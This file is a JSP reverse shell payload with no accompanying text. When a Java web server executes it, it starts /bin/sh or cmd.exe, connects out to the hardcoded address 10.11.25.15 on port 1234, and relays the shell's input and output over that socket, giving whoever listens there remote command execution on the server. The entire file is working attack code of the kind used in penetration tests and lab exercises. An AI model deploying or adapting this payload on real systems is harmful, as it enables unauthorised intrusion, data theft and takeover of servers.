<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ry;
    OutputStream yj;

    StreamConnector( InputStream ry, OutputStream yj )
    {
      this.ry = ry;
      this.yj = yj;
    }

    public void run()
    {
      BufferedReader gl  = null;
      BufferedWriter res = null;
      try
      {
        gl  = new BufferedReader( new InputStreamReader( this.ry ) );
        res = new BufferedWriter( new OutputStreamWriter( this.yj ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = gl.read( buffer, 0, buffer.length ) ) > 0 )
        {
          res.write( buffer, 0, length );
          res.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( gl != null )
          gl.close();
        if( res != null )
          res.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.11.25.15", 1234 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
